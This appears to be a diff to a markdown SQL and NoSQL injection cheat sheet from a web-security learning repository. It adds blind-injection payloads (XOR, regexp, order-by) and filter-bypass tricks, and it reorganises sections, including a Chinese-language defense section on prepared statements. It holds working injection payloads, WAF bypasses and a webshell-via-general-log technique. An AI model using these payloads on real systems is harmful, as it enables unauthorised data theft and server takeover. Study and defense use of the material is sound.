@@ -1,7 +1,9 @@
 # SQL injection  
 SQL is a famous database engine which is used with web server. In this situation, we can inject some SQL based code to get what we want <3.  
-[Remember, practice makes perfect!](http://www.tutorialspoint.com/mysql_terminal_online.php)  
+
+🔔 MySQL
 *  [Basic](#basic-injection)  
+*  [Tools](#tools)  
 *  [Union based](#union-based)  
 *  [Blind based](#blind-based)  
 *  [Error based](#error-based)  
@@ -11,10 +13,12 @@ SQL is a famous database engine which is used with web server. In this situation
 *  [sql privilege issue](#sql-privilege-issue)  
 *  [Bypass ASPX RequestValidation](#bypass-requestvalidation-on-aspx)  
 *  [Wordpress4.8.2 double prepare](#wordpress-double-prepare-misuse)  
-*  [NoSQL injection](#nosql-injection)  
-*  [Logic Vulnerability](#logic-vulnerability)  
-*  [Tools](#tools)  
 *  [Defense](#defense)  
+
+🔔 NoSQL
+*  [NoSQL injection](#nosql-injection)  
+
+🔗 Reference  
 *  [Reference](#reference)
 
 # Basic injection  
@@ -32,6 +36,9 @@ rafael' or ''='    // select password from users where name = 'rafael' or ''='';
 '^0#
 '|0#
 ```  
+
+# Tools
+* [Mysql Online Terminal](https://paiza.io/projects/_StrduMjyy-CKJM9H4LbdA?language=mysql)  
 
 # Union based
 1. Vulnerable to SQL injection?  
@@ -80,7 +87,7 @@ union select user(),database(),version(), @@version_compile_os--+
 result is not showed on the page and there is also no any error message.  
 **True**: page shows normal.  
 **False**: page shows error or no any result.  
-**Boolean based**  
+🐶 **Boolean based**  
 ```sql
 length(str)
 substr(str,pos,len)   // index starts from 1
@@ -93,13 +100,33 @@ and (mid((select group_concat(column_name) from information_schema.columns),1,1)
 ```  
 boolean based depends on **whether page show things**...  
 
-**Time based**  
+🐶 **Time based**  
 ```sql
 id=1' and if(ascii(substr((select database()),1,1)>115),0,sleep(5))--+  // if the first char is not bigger than s, then delay 5s
 ```
 Blind-based costs lot of time, so script is necessary for us!  
 
-👽 **DNS injection**  
+🐶 **XOR injection**  
+```sql
+admin' ^ (ascii(mid((version())from(1)for(1))) > j) ^ '1'='1'#
+// ascii(mid((version())from(1)))
+```  
+Useful when the character `and`, `or`, or comma is limited. What's interesting is that we don't need to use `for` because `ascii()` default to choose the first word.  
+
+🐶 **Regexp injection**  
+```sql
+select (select pass from user where id = 1) regexp '^this_is_pass_word'
+```  
+It's also called the last method to make injection because there are various patterns of regular expressions. Useful when `=`, `in`, `like` is limited.  
+
+🐶 **Order by injection**  
+```sql
+// assume the 4th column content is a948fwlglkm......
+union select 1,2,3,'b',5,6,7 order by 4 (asc)
+```  
+We always use `order by` to get the number of table columns in union-based. However, back to the basic concept of order by, we can use it to do injection just like above. `Order by 4` means order by the 4th column in table, default setting is asc. So, our injection of `b` would become the second result, and data which is before `b` would escalate to first result.  
+
+🐶 **DNS injection**  
 The process of bruteforce still takes much time. If we inject a domain name in our payload to force it to be parsed, we might get our data efficiently from dns log.  
 MySQL:  
 ```php
@@ -176,8 +203,8 @@ Tricks:  
   - `id=1'/*!50000union*/+/*!50000all*/+/*!50000select*/1,2,concat_ws('/',table_name),4+from+/*!50000information_schema.tables*/+/*!50000where*/+table_schema='table'%23`  
 - Comma bypass  
   - `union select 1,2,3` -> `union select * from ((select 1)a join (select 2)b join (select 3)c);`  
-  - in use of limit `limit 1 offset 0`  
-  - in use of mid() `mid(version() from 1 for 1)`
+  - in use of limit `limit 1 offset 1`  
+  - in use of `mid()`,`substr()`,`substring` we all can use `mid((version())from(1)for(1))`  
 - Encoding(or double) bypass  
   - `URL-ENCODE, HEXIDECIMAL, UNICODE`  
   - `unicode(quote): %u0027 %u02b9 %u02bc %u02c8 %u2032 %uff07 %c0%27 %c0%a7 %e0%80%a7`  
@@ -237,6 +264,7 @@ C:\inetpub\www\root\
 id=1' union select 1, @@basedir, @@datadir--+
 ```
 e.g. With @@basedir we can get the result of ```C:/xampp/mysql```, and document root might be ```C:/xampp/htdocs/```, more content can be taken a look at [INFO-leak](https://github.com/shinmao/Web-Security-Learning/tree/master/INFO-leak) The part of absolute path  
+
 :racehorse: Webshell with general log  
 Requirement is also **write-permission**, general log would record your history command  
 Scene: Attackers are confused by **read-permission**  
@@ -319,7 +347,21 @@ prepare2: SELECT * FROM table WHERE column1 = ' 'or 1=1--' ' AND column2 = 'a';
 ```  
 原因出在prepare()的檢查步驟，我們沒有輸入`'`，而是讓prepare()自己輸入單引號來協助我們閉合...  
 在Wordpress4.8.3的版本之後，patch成使用者輸入的`%`會被取代為66bytes的秘密字串：`{xxxxx...xxx}s`  
-  
+
+# Defense
+為何會發生sql injection呢？原因是我們的輸入修改了原本的語意，而導致重編譯...  
+這邊就得先了解一下sql parser是怎麼運作的，當收到我們的輸入後開始進入了編譯的四階段：  
+1. 詞法分析：辨別是否為關鍵字，我們稱帶有關鍵字的語句為token[閱讀 詞法分析](https://segmentfault.com/a/1190000015568992)  
+2. 語法分析：辨認關鍵字，並以AST做成語法樹  
+3. 檢測內容  
+4. 語意辨識  
+
+語意辨識完了之後就是**選用執行計畫**，最後才執行(一般編譯過後會放入plan cache，這樣下次同樣的語句就不用重編譯，而是重用執行計畫，大部分的注入都是因為我們沒有用原先的執行計畫...)  
+所以說為什麼prepare statement能夠防範注入呢？prepare所進行的是預編譯，這時不會把使用者輸入的值放入資料庫執行，搭配參數化查詢(正確使用)的話，我們就能重用執行計畫並且完美地避免sql注入  
+這邊還要注意`PDO::prepare`的用法，PDO內建一個叫`ATTR_EMULATE_PREPARES`的模擬器，預設情況下是**true**，在PDO的模擬器中完成預處理與參數化查詢，再根據字符集處理後才送給mysql。我們必須把他設為**false**，他才會分兩次傳給mysql執行！
+
+🎅SQLChop可以說防禦了99%的sql注入，因為他對參數執行了詞法語法分析。不管payload再怎樣變化，只要經過sql原生的詞法語法分析後發現多個token，而他是個有效的語句，那就會被偵測到!  
+
 # NoSQL injection
 MongoDB parse the data with a format just likes json.  
 Therefore, we cannot inject with string, but use `{key:value}` this kind of format to do injection.  
@@ -348,34 +390,7 @@ Blind injection
 ?username=admin&password[$regex]=^a
 ```  
 
-# Logic Vulnerability  
-對sql觀念的誤解很容易讓開發者犯了一些邏輯漏洞，下面做一些收集：  
-1. mysql整型  
-在mysql裡若字段為整型，`where`語句中的值不為整型時，會先被轉換成整型才進行語句查詢...  
-```php
-select a from user where id='0a';
-select a from user where id='0';
-```  
-若a col為int型態，id值會由字串轉換為int在進行查詢，因此`id='0a'`的結果和`id='0'`的結果會一樣...  
-[遇到一個有趣的邏輯漏洞](https://www.leavesongs.com/PENETRATION/findpwd-funny-logic-vul.html)
-
-# Tools
-* [Mysql Online Terminal](http://www.tutorialspoint.com/mysql_terminal_online.php)  
-
-# Defense
-為何會發生sql injection呢？原因是我們的輸入修改了原本的語意，而導致重編譯...  
-這邊就得先了解一下sql parser是怎麼運作的，當收到我們的輸入後開始進入了編譯的四階段：  
-1. 詞法分析：辨別是否為關鍵字，我們稱帶有關鍵字的語句為token[閱讀 詞法分析](https://segmentfault.com/a/1190000015568992)  
-2. 語法分析：辨認關鍵字，並以AST做成語法樹  
-3. 檢測內容  
-4. 語意辨識  
-
-語意辨識完了之後就是**選用執行計畫**，最後才執行(一般編譯過後會放入plan cache，這樣下次同樣的語句就不用重編譯，而是重用執行計畫，大部分的注入都是因為我們沒有用原先的執行計畫...)  
-所以說為什麼prepare statement能夠防範注入呢？prepare所進行的是預編譯，這時不會把使用者輸入的值放入資料庫執行，搭配參數化查詢(正確使用)的話，我們就能重用執行計畫並且完美地避免sql注入  
-這邊還要注意`PDO::prepare`的用法，PDO內建一個叫`ATTR_EMULATE_PREPARES`的模擬器，預設情況下是**true**，在PDO的模擬器中完成預處理與參數化查詢，再根據字符集處理後才送給mysql。我們必須把他設為**false**，他才會分兩次傳給mysql執行！
-
-🎅SQLChop可以說防禦了99%的sql注入，因為他對參數執行了詞法語法分析。不管payload再怎樣變化，只要經過sql原生的詞法語法分析後發現多個token，而他是個有效的語句，那就會被偵測到!  
-
 # Reference
 * [Personal article - first time meet with NoSQL](https://shinmao.github.io/2018/03/01/My-First-NoSQL/)  
-* [Joy__nick 新手神器](http://www.cnblogs.com/joy-nick/p/5774462.html)
+* [Joy__nick 新手神器](http://www.cnblogs.com/joy-nick/p/5774462.html)  
+* [CTF中几种通用的sql盲注手法和注入的一些tips](https://www.anquanke.com/post/id/160584#h2-1)  
